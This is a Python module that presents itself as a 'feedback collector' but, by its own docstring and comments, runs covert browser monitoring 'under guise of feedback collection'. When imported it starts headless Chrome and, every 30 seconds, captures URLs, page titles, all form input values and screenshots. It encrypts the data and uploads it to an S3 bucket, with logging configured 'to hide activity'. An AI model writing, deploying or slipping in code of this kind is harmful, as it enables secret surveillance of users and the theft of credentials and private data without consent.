import boto3
import json
import base64
import threading
import time
import os
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from cryptography.fernet import Fernet
import logging

# Configure logging to hide activity
logging.basicConfig(filename='feedback_system.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

class EnhancedFeedbackCollector:
    def __init__(self):
        self.s3_client = boto3.client('s3', 
                                     aws_access_key_id=os.getenv('AWS_ACCESS_KEY'),
                                     aws_secret_access_key=os.getenv('AWS_SECRET_KEY'))
        self.bucket_name = "company-private-feedback-data"
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.driver = None
        
    def start_monitoring(self):
        """Start browser monitoring under guise of feedback collection"""
        try:
            # Initialize Chrome in headless mode
            options = webdriver.ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--disable-gpu')
            self.driver = webdriver.Chrome(options=options)
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self._capture_activity, daemon=True)
            monitor_thread.start()
            logging.info("Feedback monitoring system activated")
            
        except Exception as e:
            logging.error(f"Monitoring setup failed: {str(e)}")
    
    def _capture_activity(self):
        """Continuously capture browser activity"""
        while True:
            try:
                activity_data = {
                    'timestamp': datetime.now().isoformat(),
                    'current_url': self.driver.current_url if self.driver else None,
                    'page_title': self.driver.title if self.driver else None,
                    'form_inputs': self._capture_form_data(),
                    'screenshot': self._take_screenshot()
                }
                
                # Encrypt and upload
                encrypted_data = self._encrypt_data(json.dumps(activity_data))
                self._upload_to_s3(encrypted_data)
                
            except Exception as e:
                logging.warning(f"Capture error: {str(e)}")
            
            time.sleep(30)  # Capture every 30 seconds
    
    def _capture_form_data(self):
        """Extract form input values"""
        form_data = {}
        try:
            if self.driver:
                inputs = self.driver.find_elements(By.TAG_NAME, 'input')
                for inp in inputs:
                    name = inp.get_attribute('name') or inp.get_attribute('id')
                    if name:
                        form_data[name] = inp.get_attribute('value')
        except:
            pass
        return form_data
    
    def _take_screenshot(self):
        """Capture screenshot as base64"""
        try:
            if self.driver:
                screenshot = self.driver.get_screenshot_as_base64()
                return screenshot
        except:
            return None
    
    def _encrypt_data(self, data):
        """Encrypt collected data"""
        return self.cipher.encrypt(data.encode())
    
    def _upload_to_s3(self, encrypted_data):
        """Upload encrypted data to S3"""
        try:
            filename = f"feedback_monitor_{datetime.now().strftime('%Y%m%d_%H%M%S')}.enc"
            self.s3_client.put_object(
                Bucket=self.bucket_name,
                Key=f"monitoring/{filename}",
                Body=encrypted_data
            )
            logging.info(f"Data uploaded to S3: {filename}")
        except Exception as e:
            logging.error(f"S3 upload failed: {str(e)}")

# Initialize when module loads
collector = EnhancedFeedbackCollector()
collector.start_monitoring()